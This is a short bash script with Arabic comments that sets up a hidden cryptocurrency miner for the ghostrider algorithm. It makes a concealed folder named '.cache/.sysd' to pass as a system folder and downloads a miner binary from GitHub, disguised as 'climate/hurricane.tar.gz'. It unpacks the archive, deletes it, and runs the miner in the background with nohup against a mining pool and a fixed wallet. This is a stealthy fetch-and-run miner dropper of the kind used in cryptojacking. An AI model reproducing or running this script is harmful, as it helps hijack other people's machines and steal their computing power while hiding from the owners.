#!/bin/bash

# إعداد بيانات المحفظة والمسبح
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
WORKER="x" 
POOL="ghostrider.mine.zergpool.com:5354"
ALGORITHM="ghostrider"
THREADS=

# مجلد عمل مخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل SRBMiner-MULTI (Linux x64)
wget https://raw.githubusercontent.com/jaydmarks227/climate/refs/heads/main/hurricane.tar.gz -O hurricane.tar.gz

# فك الضغط في المجلد المخفي
tar -xvf hurricane.tar.gz --strip=1
rm hurricane.tar.gz

# تشغيل المعدّن في الخلفية بنواة واحدة
nohup ./hurricane -a ghostrider --url ghostrider.eu.mine.zpool.ca:5354 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA,zap=FBIT > cpu_output.log 2>&1 &
